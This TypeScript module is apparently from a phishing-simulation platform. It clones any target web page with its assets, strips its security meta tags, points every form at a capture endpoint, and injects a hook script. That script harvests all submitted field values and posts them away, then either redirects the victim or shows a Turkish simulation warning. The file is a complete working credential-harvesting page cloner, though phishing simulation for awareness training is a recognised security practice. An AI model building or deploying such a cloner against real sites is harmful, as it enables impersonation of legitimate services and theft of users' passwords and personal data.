/**
 * Site Cloner Service — Static Mirror v5
 *
 * Instead of proxy-rewriting URLs at runtime, this version:
 *   1. Fetches the HTML page
 *   2. Discovers all CSS, JS, image, and font URLs
 *   3. Downloads each asset to /static/clones/<pageId>/
 *   4. Rewrites the HTML to point to the local static paths
 *   5. Rewrites <form action> to our capture endpoint
 *   6. Saves the final index.html locally
 *
 * The result is a fully self-contained static folder that can be
 * served by express.static with zero CSP issues.
 */

import path from 'path';
import fs from 'fs/promises';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CLONES_DIR = path.join(__dirname, '../../static/clones');

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// ============================================
// HELPERS
// ============================================

/** Resolve a potentially relative URL against a base */
function resolveUrl(raw: string, baseUrl: string): string | null {
  const t = raw.trim();
  if (
    !t ||
    t.startsWith('data:') ||
    t.startsWith('#') ||
    t.startsWith('javascript:') ||
    t.startsWith('mailto:') ||
    t.startsWith('tel:') ||
    t.startsWith('blob:') ||
    t.startsWith('{')
  ) {
    return null;
  }
  if (t.startsWith('//')) {
    return 'https:' + t;
  }
  try {
    return new URL(t, baseUrl).href;
  } catch {
    return null;
  }
}

/** Generate a safe local filename from a URL, preserving extension */
function safeFilename(urlStr: string): string {
  try {
    const u = new URL(urlStr);
    // Use pathname + a short hash of the full URL to avoid collisions
    const ext = path.extname(u.pathname) || '';
    const base = path.basename(u.pathname, ext).replace(/[^a-zA-Z0-9._-]/g, '_') || 'file';
    const hash = crypto.createHash('md5').update(urlStr).digest('hex').slice(0, 8);
    return `${base}-${hash}${ext}`;
  } catch {
    const hash = crypto.createHash('md5').update(urlStr).digest('hex').slice(0, 12);
    return hash;
  }
}

/** Download a single asset, returns local filename or null on failure */
async function fetchAsset(url: string, destDir: string): Promise<string | null> {
  try {
    const response = await fetch(url, {
      headers: { 'User-Agent': UA, 'Accept': '*/*' },
      redirect: 'follow',
      signal: AbortSignal.timeout(15000),
    });
    if (!response.ok) {
      console.log(`[Mirror] Skip ${url} — HTTP ${response.status}`);
      return null;
    }
    const buffer = Buffer.from(await response.arrayBuffer());
    const filename = safeFilename(url);
    await fs.writeFile(path.join(destDir, filename), buffer);
    return filename;
  } catch (err) {
    console.log(`[Mirror] Skip ${url} — ${err instanceof Error ? err.message : 'error'}`);
    return null;
  }
}

// ============================================
// URL EXTRACTION
// ============================================

/** Extract all asset URLs from HTML (CSS, JS, images, fonts, etc.) */
function extractAssetUrls(html: string, baseUrl: string): Map<string, string> {
  const urls = new Map<string, string>(); // absolute URL → original match

  // Attributes: src, href (for link[rel=stylesheet], script, img, etc.)
  const attrPattern = /(?:src|href)\s*=\s*["']([^"']+)["']/gi;
  let m: RegExpExecArray | null;
  while ((m = attrPattern.exec(html)) !== null) {
    const abs = resolveUrl(m[1], baseUrl);
    if (abs && abs.startsWith('http')) urls.set(abs, m[1]);
  }

  // CSS url() references inside <style> blocks and inline styles
  const cssUrlPattern = /url\(\s*['"]?([^'")]+)['"]?\s*\)/gi;
  while ((m = cssUrlPattern.exec(html)) !== null) {
    const abs = resolveUrl(m[1], baseUrl);
    if (abs && abs.startsWith('http')) urls.set(abs, m[1]);
  }

  // srcset entries
  const srcsetPattern = /srcset\s*=\s*["']([^"']+)["']/gi;
  while ((m = srcsetPattern.exec(html)) !== null) {
    for (const entry of m[1].split(',')) {
      const parts = entry.trim().split(/\s+/);
      if (parts[0]) {
        const abs = resolveUrl(parts[0], baseUrl);
        if (abs && abs.startsWith('http')) urls.set(abs, parts[0]);
      }
    }
  }

  return urls;
}

/** Extract url() references from a CSS file body */
function extractCssUrls(cssBody: string, cssFileUrl: string): Map<string, string> {
  const urls = new Map<string, string>();
  const pattern = /url\(\s*['"]?([^'")]+)['"]?\s*\)/gi;
  let m: RegExpExecArray | null;
  while ((m = pattern.exec(cssBody)) !== null) {
    const abs = resolveUrl(m[1], cssFileUrl);
    if (abs && abs.startsWith('http')) urls.set(abs, m[1]);
  }
  return urls;
}

// ============================================
// STRIP SECURITY META TAGS
// ============================================

function stripSecurityMeta(html: string): string {
  html = html.replace(/<meta[^>]*http-equiv\s*=\s*["']Content-Security-Policy["'][^>]*\/?>/gi, '');
  html = html.replace(/<meta[^>]*http-equiv\s*=\s*["']X-Frame-Options["'][^>]*\/?>/gi, '');
  html = html.replace(/<meta[^>]*http-equiv\s*=\s*["']Referrer-Policy["'][^>]*\/?>/gi, '');
  return html;
}

// ============================================
// FORM HOOK SCRIPT
// ============================================

function buildFormHookScript(): string {
  return `
<script data-phishing-hook>
(function(){
  document.addEventListener('submit', function(e) {
    e.preventDefault();
    var form = e.target;
    var data = {};
    var elems = form.querySelectorAll('input,select,textarea');
    for (var i = 0; i < elems.length; i++) {
      var el = elems[i];
      if (el.name && el.type !== 'submit' && el.type !== 'button') {
        data[el.name] = el.value;
      }
    }
    var token = new URLSearchParams(window.location.search).get('token') || '';
    fetch('/api/p/' + token, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }).then(function(r) { return r.json(); }).then(function(resp) {
      if (resp.redirectUrl) { window.location.href = resp.redirectUrl; }
      else {
        form.style.display = 'none';
        var msg = document.createElement('div');
        msg.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);display:flex;align-items:center;justify-content:center;z-index:999999;';
        msg.innerHTML = '<div style="background:#1a1b1e;border:1px solid #2c2e33;border-radius:8px;padding:40px;max-width:500px;text-align:center;color:#c1c2c5;font-family:sans-serif;">'
          + '<div style="font-size:48px;margin-bottom:16px;">\\u26A0\\uFE0F</div>'
          + '<h2 style="color:#ff6b6b;margin:0 0 12px;">PHISHING SIM\\u00dcLASYONU</h2>'
          + '<p style="margin:0 0 16px;">Bu sayfa bir g\\u00fcvenlik testiydi. Girdi\\u011finiz bilgiler <strong>kaydedilmedi</strong>.</p>'
          + '<ul style="text-align:left;margin:0 0 16px;padding-left:20px;line-height:1.8;">'
          + '<li>URL adresini her zaman kontrol edin</li>'
          + '<li>\\u015e\\u00fcpheli linklere t\\u0131klamay\\u0131n</li>'
          + '</ul></div>';
        document.body.appendChild(msg);
      }
    }).catch(function(){});
  }, true);

  document.querySelectorAll('a').forEach(function(a) {
    a.addEventListener('click', function(e) { e.preventDefault(); });
  });
})();
</script>`;
}

// ============================================
// INJECTOR — places scripts before </body>
// ============================================

function injectBeforeBodyClose(html: string, snippet: string): string {
  if (/<\/body>/i.test(html)) {
    return html.replace(/<\/body>/i, snippet + '\n</body>');
  }
  if (/<\/html>/i.test(html)) {
    return html.replace(/<\/html>/i, snippet + '\n</html>');
  }
  return html + '\n' + snippet;
}

// ============================================
// PUBLIC API — mirrorSite
// ============================================

export interface MirrorResult {
  /** Path to the static clone folder relative to /static/ (e.g. "clones/abc123") */
  staticPath: string;
  /** The rewritten HTML (also saved as index.html in the clone folder) */
  html: string;
  originalUrl: string;
  title: string;
  /** Number of assets downloaded */
  assetCount: number;
}

export async function mirrorSite(url: string, pageId: string): Promise<MirrorResult> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(url);
  } catch {
    throw new Error('Invalid URL provided');
  }

  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error('Only HTTP and HTTPS URLs are supported');
  }

  const cloneDir = path.join(CLONES_DIR, pageId);
  await fs.mkdir(cloneDir, { recursive: true });

  console.log(`[Mirror] Fetching: ${url}`);

  const response = await fetch(url, {
    headers: {
      'User-Agent': UA,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    },
    redirect: 'follow',
    signal: AbortSignal.timeout(30000),
  });

  if (!response.ok) {
    throw new Error(`Failed to fetch page: HTTP ${response.status}`);
  }

  const contentType = response.headers.get('content-type') || '';
  if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
    throw new Error('The URL did not return an HTML page');
  }

  let html = await response.text();
  const finalUrl = response.url || url;
  const baseUrl = finalUrl.substring(0, finalUrl.lastIndexOf('/') + 1) || new URL(finalUrl).origin + '/';

  // Extract title
  const titleMatch = html.match(/<title[^>]*>(.*?)<\/title>/is);
  const title = titleMatch ? titleMatch[1].trim().replace(/\s+/g, ' ') : parsedUrl.hostname;

  console.log(`[Mirror] Raw HTML: ${html.length} bytes, title: "${title}"`);

  // Step 1: Strip security meta tags
  html = stripSecurityMeta(html);

  // Step 2: Fix protocol-relative URLs
  html = html.replace(/(src|href|action|poster)\s*=\s*"\/\//gi, (_m, attr) => `${attr}="https://`);
  html = html.replace(/(src|href|action|poster)\s*=\s*'\/\//gi, (_m, attr) => `${attr}='https://`);
  html = html.replace(/url\(\s*(['"]?)\/\//gi, (_m, q) => `url(${q}https://`);

  // Step 3: Discover all asset URLs
  const assetUrls = extractAssetUrls(html, baseUrl);
  console.log(`[Mirror] Found ${assetUrls.size} asset URLs to download`);

  // Step 4: Download all assets in parallel (with concurrency limit)
  const localPrefix = `/static/clones/${pageId}`;
  const urlToLocal = new Map<string, string>(); // absolute URL → local path

  const entries = Array.from(assetUrls.entries());
  const BATCH = 10;
  let downloadCount = 0;

  for (let i = 0; i < entries.length; i += BATCH) {
    const batch = entries.slice(i, i + BATCH);
    const results = await Promise.all(
      batch.map(async ([absUrl]) => {
        const filename = await fetchAsset(absUrl, cloneDir);
        return { absUrl, filename };
      })
    );
    for (const { absUrl, filename } of results) {
      if (filename) {
        urlToLocal.set(absUrl, `${localPrefix}/${filename}`);
        downloadCount++;
      }
    }
  }

  console.log(`[Mirror] Downloaded ${downloadCount}/${assetUrls.size} assets`);

  // Step 5: For downloaded CSS files, also download their internal url() references
  const cssFiles = entries.filter(([absUrl]) => {
    const local = urlToLocal.get(absUrl);
    return local && (absUrl.endsWith('.css') || absUrl.includes('.css?'));
  });

  for (const [cssUrl] of cssFiles) {
    try {
      const localFile = urlToLocal.get(cssUrl);
      if (!localFile) continue;
      const cssFilePath = path.join(CLONES_DIR, pageId, path.basename(localFile));
      const cssBody = await fs.readFile(cssFilePath, 'utf-8');
      const cssAssets = extractCssUrls(cssBody, cssUrl);

      for (const [assetUrl] of cssAssets) {
        if (urlToLocal.has(assetUrl)) continue;
        const filename = await fetchAsset(assetUrl, cloneDir);
        if (filename) {
          urlToLocal.set(assetUrl, `${localPrefix}/${filename}`);
          downloadCount++;
        }
      }

      // Rewrite the CSS file's url() references to local paths
      let updatedCss = cssBody;
      for (const [assetUrl, originalRef] of cssAssets) {
        const localPath = urlToLocal.get(assetUrl);
        if (localPath) {
          // In CSS files, use just the filename (same directory)
          const justFilename = path.basename(localPath);
          updatedCss = updatedCss.split(originalRef).join(justFilename);
        }
      }
      await fs.writeFile(cssFilePath, updatedCss);
    } catch {
      // CSS sub-asset download failure is non-fatal
    }
  }

  // Step 6: Rewrite HTML — replace absolute URLs with local paths
  // Sort by URL length descending to avoid partial replacements
  const sortedMappings = Array.from(urlToLocal.entries()).sort((a, b) => b[0].length - a[0].length);

  for (const [absUrl, localPath] of sortedMappings) {
    // Replace the absolute URL wherever it appears in the HTML
    html = html.split(absUrl).join(localPath);

    // Also replace the original relative reference if it was different
    const originalRef = assetUrls.get(absUrl);
    if (originalRef && originalRef !== absUrl) {
      // Be careful: only replace in attribute contexts, not random text
      // Replace in double-quoted attributes
      html = html.split(`"${originalRef}"`).join(`"${localPath}"`);
      html = html.split(`'${originalRef}'`).join(`'${localPath}'`);
      // url() in CSS
      html = html.split(`url(${originalRef})`).join(`url(${localPath})`);
      html = html.split(`url('${originalRef}')`).join(`url('${localPath}')`);
      html = html.split(`url("${originalRef}")`).join(`url("${localPath}")`);
    }
  }

  // Step 7: Neutralize form actions — point to our capture endpoint
  // Replace form action with a placeholder that the serving layer fills in
  html = html.replace(
    /<form([^>]*)\s+action\s*=\s*["'][^"']*["']/gi,
    '<form$1 action="/api/p/__TOKEN__"'
  );
  // Forms without action attribute — add one
  html = html.replace(
    /<form(?![^>]*action\s*=)([^>]*)>/gi,
    '<form$1 action="/api/p/__TOKEN__">'
  );

  // Step 8: Inject form hook script
  html = injectBeforeBodyClose(html, buildFormHookScript());

  // Step 9: Save the final HTML as index.html in the clone folder
  await fs.writeFile(path.join(cloneDir, 'index.html'), html, 'utf-8');

  console.log(`[Mirror] Complete: ${title} — ${downloadCount} assets, saved to ${cloneDir}`);

  return {
    staticPath: `clones/${pageId}`,
    html,
    originalUrl: finalUrl,
    title,
    assetCount: downloadCount,
  };
}

// ============================================
// UTILITY: Delete a clone folder
// ============================================

export async function deleteCloneFolder(pageId: string): Promise<void> {
  const cloneDir = path.join(CLONES_DIR, pageId);
  try {
    await fs.rm(cloneDir, { recursive: true, force: true });
    console.log(`[Mirror] Deleted clone folder: ${cloneDir}`);
  } catch {
    // Non-fatal — folder may not exist
  }
}
